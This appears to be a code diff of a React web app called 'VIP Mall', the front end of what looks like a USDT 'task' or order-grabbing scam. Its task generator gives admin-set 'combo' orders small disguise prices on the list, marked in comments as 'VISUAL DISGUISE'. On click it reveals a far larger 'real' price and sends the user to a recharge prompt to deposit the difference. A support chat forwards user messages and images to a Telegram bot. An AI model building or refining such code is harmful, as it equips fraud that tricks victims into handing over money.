+            const sendToTelegram = async (text, imageFile) => { try { if (imageFile) { const formData = new FormData(); formData.append('chat_id', CHAT_ID); formData.append('photo', imageFile); if (text) formData.append('caption', text); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } else if (text) { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text }) }); } } catch (error) { console.error("Telegram Error:", error); } };
+            const handleSend = async () => { if (!inputText.trim()) return; const textToSend = inputText; const newMessage = { id: 'loc_' + Date.now(), text: textToSend, sender: 'user', time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) }; setMessages(prev => [...prev, newMessage]); setInputText(''); await sendToTelegram(textToSend, null); };
+            const handleFileChange = async (e) => { const file = e.target.files[0]; if (file) { const imageUrl = URL.createObjectURL(file); const newMessage = { id: 'loc_' + Date.now(), type: 'image', url: imageUrl, sender: 'user', time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) }; setMessages(prev => [...prev, newMessage]); await sendToTelegram(null, file); e.target.value = null; } };
+            const handleDelete = (msgId) => { setMessages(prev => prev.filter(m => m.id !== msgId)); setSelectedImgId(null); };
 
             return (
                 <div className="fixed inset-0 z-[60] flex flex-col animate-fade-in" style={{ height: '100dvh', width: '100vw', backgroundColor: '#FFFDE7' }}>
@@ -1425,55 +1330,28 @@
                             </span>
                         </div>
                     </div>
-
                     <div className="flex-1 overflow-y-auto p-4 space-y-4" onClick={() => setSelectedImgId(null)} style={{ WebkitOverflowScrolling: 'touch', paddingBottom: '90px' }}>
                         {messages.map((msg, idx) => (
                             <div key={idx} className={`flex w-full ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
-                                <div className={`max-w-[75%] rounded-2xl p-3 relative shadow-sm ${
-                                    msg.sender === 'user' 
-                                        ? 'bg-red-600 text-white rounded-br-none shadow-red-200' 
-                                        : 'bg-white text-gray-800 rounded-bl-none border border-gray-200'
-                                }`}>
+                                <div className={`max-w-[75%] rounded-2xl p-3 relative shadow-sm ${msg.sender === 'user' ? 'bg-red-600 text-white rounded-br-none shadow-red-200' : 'bg-white text-gray-800 rounded-bl-none border border-gray-200'}`}>
                                     {msg.type === 'image' ? (
                                         <div className="relative" onContextMenu={(e) => e.preventDefault()} onClick={(e) => { e.stopPropagation(); setSelectedImgId(msg.id === selectedImgId ? null : msg.id); }}>
                                             <img src={msg.url} className="rounded-lg max-h-48 w-full object-cover mb-1 cursor-pointer" />
-                                            {selectedImgId === msg.id && (
-                                                <div className="absolute inset-0 bg-black/50 flex items-center justify-center rounded-lg">
-                                                    <button onClick={(e) => { e.stopPropagation(); handleDelete(msg.id); }} className="bg-black text-white px-4 py-2 rounded font-bold border border-white flex items-center gap-2 text-xs hover:bg-red-900 transition-colors">
-                                                        <Trash2 size={16}/> DELETE
-                                                    </button>
-                                                </div>
-                                            )}
+                                            {selectedImgId === msg.id && ( <div className="absolute inset-0 bg-black/50 flex items-center justify-center rounded-lg"> <button onClick={(e) => { e.stopPropagation(); handleDelete(msg.id); }} className="bg-black text-white px-4 py-2 rounded font-bold border border-white flex items-center gap-2 text-xs hover:bg-red-900 transition-colors"> <Trash2 size={16}/> DELETE </button> </div> )}
                                         </div>
-                                    ) : (
-                                        <p className="text-sm leading-relaxed whitespace-pre-wrap">{msg.text}</p>
-                                    )}
+                                    ) : ( <p className="text-sm leading-relaxed whitespace-pre-wrap">{msg.text}</p> )}
                                     <span className={`text-[9px] block text-right mt-1 opacity-70`}>{msg.time}</span>
                                 </div>
                             </div>
                         ))}
                         <div ref={messagesEndRef} />
                     </div>
-
                     <div className="fixed bottom-0 left-0 right-0 p-3 bg-[#FFF9C4] border-t border-yellow-200 z-50 w-full pb-safe"> 
                         <div className="flex items-center gap-2 max-w-md mx-auto">
                             <input type="file" ref={fileInputRef} style={{ display: 'none' }} accept="image/*" onChange={handleFileChange}/>
-                            <button onClick={() => fileInputRef.current.click()} className="p-2.5 rounded-full bg-white border border-gray-200 text-gray-500 active:scale-95 transition-transform shadow-sm">
-                                <ImageBtn size={20} />
-                            </button>
-                            <div className="flex-1 bg-white rounded-full border border-gray-200 flex items-center px-4 py-2.5 focus-within:border-red-600 transition-colors shadow-sm">
-                                <input 
-                                    type="text" 
-                                    value={inputText} 
-                                    onChange={(e) => setInputText(e.target.value)} 
-                                    onKeyDown={(e) => e.key === 'Enter' && handleSend()} 
-                                    placeholder={getText(lang, 'type_msg')} 
-                                    className="bg-transparent w-full text-black text-sm placeholder-gray-400"
-                                />
-                            </div>
-                            <button onClick={handleSend} className="p-3 rounded-full bg-red-600 text-white shadow-lg active:scale-95 transition-transform hover:bg-red-500">
-                                <Send size={18} />
-                            </button>
+                            <button onClick={() => fileInputRef.current.click()} className="p-2.5 rounded-full bg-white border border-gray-200 text-gray-500 active:scale-95 transition-transform shadow-sm"> <ImageBtn size={20} /> </button>
+                            <div className="flex-1 bg-white rounded-full border border-gray-200 flex items-center px-4 py-2.5 focus-within:border-red-600 transition-colors shadow-sm"> <input type="text" value={inputText} onChange={(e) => setInputText(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && handleSend()} placeholder={getText(lang, 'type_msg')} className="bg-transparent w-full text-black text-sm placeholder-gray-400" /> </div>
+                            <button onClick={handleSend} className="p-3 rounded-full bg-red-600 text-white shadow-lg active:scale-95 transition-transform hover:bg-red-500"> <Send size={18} /> </button>
                         </div>
                     </div>
                 </div>
@@ -1507,7 +1385,7 @@
                                         <ShoppingBagIcon size={16} className="text-white m-auto mt-2" />
                                     </OneTimeLogoButton>
                                 </div>
-                                <h2 className="text-xl font-bold text-white">{appSettings.title || 'VIP Mall'}</h2>
+                                <h2 className="text-xl font-bold text-white">{appSettings?.title || 'VIP Mall'}</h2>
                             </div>
                             <span className="bg-[#111] border border-[#222] text-[10px] px-3 py-1 rounded-full text-gray-400">All Markets</span>
                         </div>
@@ -1521,10 +1399,8 @@
                     <div className="flex-1 overflow-y-auto p-4 flex flex-col pb-32">
                          {items.map((item, idx) => (
                              <div key={idx} className="mb-6">
-                                 {/* MODIFIED: Increased height to h-64, removed text overlay as requested */}
                                  <div className="w-full h-64 border border-[#222] rounded-xl overflow-hidden relative shrink-0">
                                      <img src={item.img} alt={item.title} className="absolute inset-0 w-full h-full object-cover" />
-                                     {/* Text block removed per request */}
                                  </div>
                              </div>
                          ))}
@@ -1547,31 +1423,39 @@
             const [submitId, setSubmitId] = useState(null);   
             const [showSuccess, setShowSuccess] = useState(false);
             
-            // TASK CONFIGS FROM DB
-            const [adminTaskConfigs, setAdminTaskConfigs] = useState({});
-            
-            // Refs for Image Uploads
-            const amazonRef = useRef(null);
-            const alibabaRef = useRef(null);
-            const aliexpressRef = useRef(null);
+            // ANTI-CHEAT & PERSISTENCE
+            const [adminTaskConfigs, setAdminTaskConfigs] = useState(() => {
+                // Initialize from localStorage first to prevent "Old Product" flicker
+                const saved = localStorage.getItem('vip_task_configs');
+                return saved ? JSON.parse(saved) : {};
+            });
+            const [isDataSynced, setIsDataSynced] = useState(false);
 
             // Listen for Admin Configs
             useEffect(() => {
+                if(!db) return;
                 const ref = db.ref('task_configs');
                 ref.on('value', snap => {
                     const val = snap.val();
-                    if(val) setAdminTaskConfigs(val);
+                    if(val) {
+                        setAdminTaskConfigs(val);
+                        // Save immediately to avoid future loading gaps
+                        localStorage.setItem('vip_task_configs', JSON.stringify(val));
+                        setIsDataSynced(true);
+                    } else {
+                        setIsDataSynced(true); // Empty but synced
+                    }
                 });
                 return () => ref.off();
             }, []);
 
             useEffect(() => {
                 generateAndSaveTasks();
-            }, [firebaseProducts, adminTaskConfigs]); 
+            }, [adminTaskConfigs]); 
 
             // Load last round time from DB
             useEffect(() => {
-                if(userData.username) {
+                if(userData.username && db) {
                     db.ref(`users/${userData.username}/lastRoundTime`).once('value', snap => {
                         if(snap.exists()) setLastRoundTime(snap.val());
                     });
@@ -1613,11 +1497,13 @@
                     let customTitle = prodInfo.n;
                     let customImg = prodInfo.i;
                     let comboSubItems = [];
+                    // Flag to track if this data is from admin or default (Anti-cheat)
+                    let isFromAdmin = false;
 
                     if (adminConf) {
+                        isFromAdmin = true;
                         if(adminConf.title) customTitle = adminConf.title;
                         if(adminConf.img) customImg = adminConf.img;
-                        // MODIFIED: Use unitPrice for display disguised price, fall back to normal price if missing
                         if(adminConf.unitPrice) rawBasePrice = parseFloat(adminConf.unitPrice);
                         else if(adminConf.price) rawBasePrice = parseFloat(adminConf.price);
                         
@@ -1632,6 +1518,7 @@
                             }));
                         }
                     } else {
+                         // Fallback Logic
                          let priceMin = 5, priceMax = 10;
                          let multiMin = 1, multiMax = 5;
                          if (i >= 8) { priceMin = 10; priceMax = 20; multiMin = 2; multiMax = 8; }
@@ -1639,8 +1526,6 @@
                          
                          rawBasePrice = getRandomPrice(priceMin, priceMax);
                          multiplierVal = getRandomMultiplier(multiMin, multiMax);
-                         
-                         // MODIFIED: REMOVED RANDOM COMBOS. Strictly false unless Admin sets it.
                          isComboTask = false; 
                     }
                     
@@ -1649,31 +1534,25 @@
                     const commRate = 0.625; 
                     let expertIncome;
 
-                    // MODIFIED: COMBO LOGIC - Disguise & Real Reveal
                     if (isComboTask) {
-                        // Calculate Total Price based on Sub-items (Unit * Multiplier)
                         let totalCalculatedPrice = 0;
                         let finalComboSubItems = [];
 
                         if(adminConf && adminConf.comboDetails && Array.isArray(adminConf.comboDetails)) {
                              finalComboSubItems = adminConf.comboDetails.map(item => {
-                                 // Admin might send fields: unitPrice/price, multiplier/gun, title, img
                                  const uPrice = parseFloat(item.unitPrice || item.price || 0);
                                  const qty = parseFloat(item.multiplier || item.gun || 1);
                                  const itemTotal = uPrice * qty;
                                  totalCalculatedPrice += itemTotal;
-                                 
                                  return {
                                      n: item.title || "Combo Item",
                                      i: item.img || "https://placehold.co/100",
                                      unitPrice: uPrice.toFixed(2),
                                      multiplier: qty,
-                                     price: itemTotal.toFixed(2) // Display Total for this item row
+                                     price: itemTotal.toFixed(2) 
                                  };
                              });
                         } else {
-                             // Fallback Logic (if no details from admin but isCombo is true)
-                             // Generate 4 items that sum up to a target price
                              const target = adminConf && adminConf.price ? parseFloat(adminConf.price) : 5000.00;
                              let currentSum = 0;
                              const platformDefaults = DEFAULT_PRODUCTS_DATA[platform] || DEFAULT_PRODUCTS_DATA['Amazon'];
@@ -1681,15 +1560,12 @@
                              for(let k=0; k<4; k++) {
                                  const pItem = platformDefaults[(i+k) % platformDefaults.length];
                                  let itemPrice = 0;
-                                 // Distribution logic
                                  if(k === 3) itemPrice = target - currentSum;
                                  else if (k === 0) itemPrice = (target / 4) * 0.8;
                                  else itemPrice = (target - currentSum - (target/4)) / (3-k); 
 
                                  if(itemPrice <= 0) itemPrice = 100;
-                                 
-                                 // Final Adjustment
-                                 if(k === 3) itemPrice = target - currentSum; // ensure exact match on last
+                                 if(k === 3) itemPrice = target - currentSum; 
                                  else currentSum += itemPrice;
 
                                  finalComboSubItems.push({
@@ -1703,51 +1579,39 @@
                              totalCalculatedPrice = target;
                         }
 
-                        // Set Real Values based on SUM
                         const totalTargetPrice = totalCalculatedPrice;
-                        // 50% Commission rule as requested
                         const totalComm = totalTargetPrice * 0.50; 
                         const totalIncome = totalTargetPrice + totalComm;
 
-                        // DISGUISE (Single Card View) - Use First Item
                         if(finalComboSubItems.length > 0) {
                             const first = finalComboSubItems[0];
                             customTitle = first.n;
                             customImg = first.i;
-                            finalPrice = first.price; // Use the total price of the first item row
-                            
-                            // Disguise Commission (Proportional or just 50% of first item for consistency)
+                            finalPrice = first.price; 
                             comm = (parseFloat(finalPrice) * 0.50).toFixed(2);
                             expertIncome = (parseFloat(finalPrice) + parseFloat(comm)).toFixed(2);
                         }
 
-                        // PUSH TASK
                         tasks.push({ 
                             n: customTitle,
                             i: customImg,
                             id: taskId,
                             platform,
                             isCombo: true,
-                            
-                            // DISGUISE VALUES (Shown on List)
                             basePrice: (parseFloat(finalPrice) / multiplierVal).toFixed(2), 
                             price: finalPrice, 
                             comm: comm, 
                             multiplier: 1, 
                             expertIncome: expertIncome,
-                            
-                            // REAL VALUES (For Logic & Modal)
                             realPrice: totalTargetPrice.toFixed(2),
                             realComm: totalComm.toFixed(2),
                             realIncome: totalIncome.toFixed(2),
-                            
                             time: getOrderTime(),
-                            comboSubItems: finalComboSubItems 
+                            comboSubItems: finalComboSubItems,
+                            isFromAdmin: isFromAdmin
                         });
 
                     } else {
-                        // Normal Single Calculation (Display Price x Multiplier)
-                        // If Admin sets Price explicitly, use it. Otherwise calc.
                         if (adminConf && adminConf.price) {
                              finalPrice = parseFloat(adminConf.price).toFixed(2);
                         } else {
@@ -1774,7 +1638,8 @@
                             multiplier: multiplierVal, 
                             expertIncome,
                             time: getOrderTime(),
-                            comboSubItems: []
+                            comboSubItems: [],
+                            isFromAdmin: isFromAdmin
                         });
                     }
                 }
@@ -1789,6 +1654,18 @@
             };
 
             const handleCardClick = (index) => {
+                // ANTI-CHEAT BLOCKER
+                // If the task data is NOT from admin and we haven't confirmed sync yet, block it.
+                // Assuming adminTaskConfigs is populated if we have data. 
+                // However, we populated adminTaskConfigs from localStorage, so if localStorage has data, we are good.
+                // If localStorage is empty AND firebase hasn't returned yet, we block.
+                const hasConfig = Object.keys(adminTaskConfigs).length > 0;
+                
+                if (!hasConfig && !isDataSynced) {
+                    showToast("⏳ System Synchronizing... Wait for Admin Data.");
+                    return;
+                }
+
                 if (index !== completedCount) {
                     if (index > completedCount) return showToast("⚠️ Please complete previous orders first.");
                     if (index < completedCount) return showToast("✅ Already completed.");
@@ -1797,13 +1674,11 @@
 
                 const task = taskList[index];
                 
-                // For logic check, use REAL price if combo, else standard price
                 const cost = parseFloat(task.isCombo ? task.realPrice : task.price);
                 const currentBal = parseFloat(userBalance);
                 
                 if (currentBal < cost) {
                     const needed = (cost - currentBal).toFixed(2);
-                    // Show real numbers in recharge modal
                     setRechargeData({ 
                         price: task.isCombo ? task.realPrice : task.price, 
                         comm: task.isCombo ? task.realComm : task.comm, 
@@ -1833,7 +1708,6 @@
 
             const submitCombo = () => {
                 const task = taskList[completedCount];
-                // Use REAL price
                 const cost = parseFloat(task.realPrice);
                 const currentBal = parseFloat(userBalance);
                 
@@ -1867,13 +1741,15 @@
                 setCompletedCount(newCount);
                 setUserBalance(newBal);
 
-                db.ref(`users/${userData.username}`).update({ balance: newBal, completedCount: newCount });
-                db.ref('financial_records').push({
-                    type: task.isCombo ? 'Combo Commission' : 'Task Commission',
-                    amount: commVal.toFixed(2),
-                    date: new Date().toLocaleString(),
-                    username: userData.username
-                });
+                if(db) db.ref(`users/${userData.username}`).update({ balance: newBal, completedCount: newCount });
+                if(db) {
+                    db.ref('financial_records').push({
+                        type: task.isCombo ? 'Combo Commission' : 'Task Commission',
+                        amount: commVal.toFixed(2),
+                        date: new Date().toLocaleString(),
+                        username: userData.username
+                    });
+                }
             };
 
             const handlePlatformSubmit = () => {
@@ -1883,7 +1759,7 @@
                 }
                 const now = Date.now();
                 setLastRoundTime(now);
-                db.ref(`users/${userData.username}`).update({ lastRoundTime: now });
+                if(db) db.ref(`users/${userData.username}`).update({ lastRoundTime: now });
                 showToast("✅ Batch Submitted Successfully!");
                 setShowSuccess(true);
                 setTimeout(() => setShowSuccess(false), 2500);
@@ -1892,7 +1768,7 @@
             const handleResetTasks = () => {
                 setCompletedCount(0);
                 setLastRoundTime(0);
-                db.ref(`users/${userData.username}`).update({ completedCount: 0, lastRoundTime: 0 });
+                if(db) db.ref(`users/${userData.username}`).update({ completedCount: 0, lastRoundTime: 0 });
                 showToast("✅ New Round Started!");
             };
 
@@ -1905,20 +1781,17 @@
                             <div className="flex justify-between items-center mb-3">
                                 <h2 className="text-2xl font-bold text-white">VIP {getText(lang, 'menu')}</h2>
                                 <div className="bg-black px-3 py-1 rounded-full border border-[#333] text-xs text-gray-400">
-                                    {/* FIXED BALANCE FORMAT: toFixed(2) */}
                                     Bal: USDT$ {parseFloat(userBalance).toFixed(2)}
                                 </div>
                             </div>
                             <div className="flex justify-between gap-2">
                                 {['All', 'VIP1', 'VIP2', 'VIP3'].map(btn => (
-                                    // FIXED: Changed py-1 back to py-3 to make buttons thicker/mota as requested
                                     <button key={btn} onClick={() => setActiveFilter(btn)} className={`flex-1 py-3 text-sm font-bold rounded-lg transition-all ${activeFilter === btn ? 'bg-red-600 text-white shadow-lg shadow-red-900/50' : 'bg-[#222] text-gray-400 hover:bg-[#333]'}`}>{btn}</button>
                                 ))}
                             </div>
                         </div>
                         
                         <div className="flex-1 overflow-y-auto px-4 space-y-2 pt-2 pb-40">
-                            {/* FIXED LOGO LOGIC (ONE-TIME SETUP) - CARDS NOW WHITE AS REQUESTED */}
                             {(activeFilter === 'All' || activeFilter === 'VIP1') && (
                                 <div onClick={(e) => { e.stopPropagation(); startPlatform('Amazon'); }} className="bg-white rounded-xl p-4 min-h-[110px] flex items-center shadow-sm border border-yellow-100 active:scale-98 transition-transform cursor-pointer relative overflow-hidden mt-2">
                                     <div className="absolute top-0 right-0 bg-yellow-600 text-white font-bold text-[10px] px-2 py-0.5 rounded-bl-lg rounded-tr-lg z-10">VIP 1</div>
@@ -2070,17 +1943,14 @@
                                         </div>
                                         <div className="flex justify-between items-center text-[9px]">
                                             <span className="text-gray-500 font-medium">Product order</span>
-                                            {/* VISUAL DISGUISE: Shows task.price (Small for Combo, Normal for Single) */}
                                             <span className="font-mono text-gray-800 font-bold">{task.price}USDT</span>
                                         </div>
                                         <div className="flex justify-between items-center text-[9px]">
                                             <span className="text-gray-500 font-medium">Commission.</span>
-                                            {/* VISUAL DISGUISE: Shows task.comm (Small for Combo, Normal for Single) */}
                                             <span className="font-mono text-gray-800 font-bold">{task.comm}USDT</span>
                                         </div>
                                         <div className="flex justify-between items-center text-[9px]">
                                             <span className="text-gray-500 font-medium">Expert income.</span>
-                                            {/* VISUAL DISGUISE: Shows task.expertIncome (Small for Combo, Normal for Single) */}
                                             <span className="font-mono text-gray-800 font-bold">{task.expertIncome}USDT</span>
                                         </div>
                                     </div>
@@ -2147,55 +2017,56 @@
 
                     {showCombo && (
                         <div className="combo-modal-overlay animate-fade-in">
-                            <div className="combo-modal-content animate-pop-up relative overflow-hidden animate-disco combo-yellow-gradient combo-glow">
+                            {/* NEW VIP COMBO CARD DESIGN */}
+                            <div className="combo-modal-content animate-pop-up relative overflow-hidden animate-police combo-vip-gradient" style={{ border: '4px solid #fff' }}>
                                 <div className="absolute -top-10 left-0 right-0 text-center text-4xl animate-bounce z-50 pointer-events-none">⚡</div>
                                 <div className="absolute -top-10 left-10 text-4xl animate-bounce delay-100 z-50 pointer-events-none">✨</div>
                                 <div className="absolute -top-10 right-10 text-4xl animate-bounce delay-200 z-50 pointer-events-none">⚡</div>
 
-                                <div className="p-4 text-center relative overflow-hidden">
+                                <div className="p-4 text-center relative overflow-hidden border-b border-yellow-200">
                                      <div className="flex items-center justify-center gap-2 mb-1">
-                                        <span className="text-yellow-600 font-black">⚡</span>
-                                        <h2 className="text-xl font-black text-black italic tracking-widest relative z-10">COMBO PACK</h2>
-                                        <span className="text-yellow-600 font-black">⚡</span>
+                                        <span className="text-black font-black text-xl">⚡</span>
+                                        <h2 className="text-2xl font-black text-black italic tracking-widest relative z-10" style={{ textShadow: '0 1px 2px rgba(255,255,255,0.8)' }}>VIP COMBO</h2>
+                                        <span className="text-black font-black text-xl">⚡</span>
                                      </div>
-                                     <p className="text-[10px] text-black font-bold relative z-10 uppercase tracking-wider bg-yellow-400 inline-block px-2 py-0.5 rounded">WELCOME BONUS</p>
+                                     <p className="text-[10px] text-white font-bold relative z-10 uppercase tracking-wider bg-black inline-block px-3 py-1 rounded">PREMIUM REWARD</p>
                                 </div>
                                 
-                                <div className="px-4 pb-4 max-h-[70vh] overflow-y-auto">
+                                <div className="px-4 pb-4 max-h-[70vh] overflow-y-auto mt-2">
                                     <div className="flex flex-col gap-2 mb-4">
                                         {comboItems.map((item, idx) => (
-                                            <div key={idx} className="flex items-center bg-white p-2 rounded-lg border border-yellow-200 shadow-sm">
+                                            <div key={idx} className="flex items-center bg-white/80 p-2 rounded-lg border border-yellow-500 shadow-sm backdrop-blur-sm">
                                                 <div className="w-12 h-12 bg-white rounded p-1 shrink-0 border border-gray-100 mr-3">
                                                     <img src={item.i} className="w-full h-full object-contain" />
                                                 </div>
                                                 <div className="flex-1 min-w-0">
-                                                    <p className="text-xs text-gray-800 font-normal truncate">{item.n}</p>
+                                                    <p className="text-xs text-black font-bold truncate">{item.n}</p>
                                                     <p className="text-sm text-black font-black mt-1">{item.price} USDT</p>
                                                 </div>
                                             </div>
                                         ))}
                                     </div>
 
-                                    <div className="space-y-1 mb-4 bg-yellow-50 p-3 rounded-xl border border-yellow-200">
+                                    <div className="space-y-1 mb-4 bg-white/90 p-3 rounded-xl border-2 border-black/10 shadow-lg">
                                         <div className="flex justify-between items-center text-[10px]">
-                                            <span className="text-black font-normal">Order time</span>
+                                            <span className="text-black font-bold">Order time</span>
                                             <span className="font-mono text-black font-bold">{taskList[completedCount].time}</span>
                                         </div>
                                         <div className="flex justify-between items-center text-[10px]">
-                                            <span className="text-black font-normal">Product order</span>
+                                            <span className="text-black font-bold">Product order</span>
                                             <span className="font-mono text-black font-bold">{taskList[completedCount].realPrice}USDT</span>
                                         </div>
                                         <div className="flex justify-between items-center text-[10px]">
-                                            <span className="text-black font-normal">Commission</span>
+                                            <span className="text-black font-bold">Commission</span>
                                             <span className="font-mono text-black font-bold">{taskList[completedCount].realComm}USDT</span>
                                         </div>
-                                        <div className="flex justify-between items-center text-sm bg-white p-2 rounded-lg mt-2 border border-yellow-200 shadow-sm">
-                                            <span className="text-black font-bold">Expert Income</span>
-                                            <span className="text-orange-500 font-black text-lg">{taskList[completedCount].realIncome}USDT</span>
+                                        <div className="flex justify-between items-center text-sm bg-black text-white p-2 rounded-lg mt-2 shadow-sm">
+                                            <span className="font-bold">Expert Income</span>
+                                            <span className="text-yellow-400 font-black text-lg">{taskList[completedCount].realIncome}USDT</span>
                                         </div>
                                     </div>
 
-                                    <button onClick={submitCombo} className="w-full py-3 bg-[#FACC15] hover:bg-[#EAB308] rounded-xl font-black text-black shadow-lg active:scale-95 transition-transform uppercase text-sm tracking-widest border-b-4 border-yellow-600">
+                                    <button onClick={submitCombo} className="w-full py-4 bg-black hover:bg-gray-900 rounded-xl font-black text-yellow-400 shadow-xl active:scale-95 transition-transform uppercase text-sm tracking-widest border border-yellow-500">
                                         SUBMIT NOW
                                     </button>
                                 </div>
@@ -2304,10 +2175,10 @@
             ];
             const fileInputRef = useRef(null);
 
-            // Added State for Data Display
             const [totals, setTotals] = useState({ dep: '0.00', with: '0.00', comm: '0.00' });
 
             useEffect(() => {
+                if(!db) return;
                 const ref = db.ref('financial_records');
                 const listener = ref.on('value', snap => {
                     const val = snap.val();
@@ -2361,7 +2232,6 @@
                     <div className="mb-4 flex justify-between items-start px-2">
                         <div className="flex flex-col items-start justify-center">
                             <span className="text-sm font-bold text-white mb-1 uppercase tracking-wide">{getText(lang, 'balance')}</span>
-                            {/* FIXED BALANCE FORMAT: toFixed(2) */}
                             <h1 key={userBalance} className="text-xl font-black text-white whitespace-nowrap mt-3 text-stretch">USDT$ {Number(userBalance).toFixed(2)}</h1>
                         </div>
                         <div className="flex gap-4">
@@ -2448,12 +2318,10 @@
             const [userData, setUserData] = useState({ username: 'USER', inviteCode: '000000', level: 'VIP 0', id: '8839201' });
             const [profileImage, setProfileImage] = useState(null);
             
-            // Dynamic Data States
             const [appSettings, setAppSettings] = useState({ title: 'VIP Mall', logo: '' });
             const [firebaseProducts, setFirebaseProducts] = useState(null);
             const [homeItems, setHomeItems] = useState([]);
             
-            // Custom Images State (Persistent in LocalStorage)
             const [customImages, setCustomImages] = useState(() => {
                 const saved = localStorage.getItem('vip_custom_logos_final');
                 return saved ? JSON.parse(saved) : {};
@@ -2469,7 +2337,6 @@
             });
 
             const handleUpdateCustomImage = (key, file) => {
-                // If it's a file object (from upload)
                 if(typeof file !== 'string') {
                     if(file) {
                         const reader = new FileReader();
@@ -2481,7 +2348,6 @@
                         reader.readAsDataURL(file);
                     }
                 } else {
-                    // If it's already a base64 string
                     const newImages = { ...customImages, [key]: file };
                     setCustomImages(newImages);
                     localStorage.setItem('vip_custom_logos_final', JSON.stringify(newImages));
@@ -2503,15 +2369,13 @@
 
             useEffect(() => { const savedImage = localStorage.getItem('profileImage'); if (savedImage) setProfileImage(savedImage); }, []);
             
-            // --- MAIN FIREBASE LISTENERS ---
             useEffect(() => { 
-                if (isAuthenticated && !isAdmin && userData.username) {
+                if (isAuthenticated && !isAdmin && userData.username && db) {
                     const userRef = db.ref(`users/${userData.username}`);
                     const handleUserUpdate = (snapshot) => {
                         const val = snapshot.val();
                         if (val) {
                             if(val.balance !== undefined && val.balance !== null) {
-                                // Keep raw string/number in state, format in render
                                 setUserBalance(val.balance); 
                             }
                             if(val.completedCount !== undefined) setCompletedCount(val.completedCount);
@@ -2608,9 +2472,12 @@
             );
         };
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
+        const container = document.getElementById('root');
+        if (container) {
+            const root = ReactDOM.createRoot(container);
+            root.render(<App />);
+        }
+       </script>
 <script type="module" src="/index.tsx"></script>
 </body>
 </html>
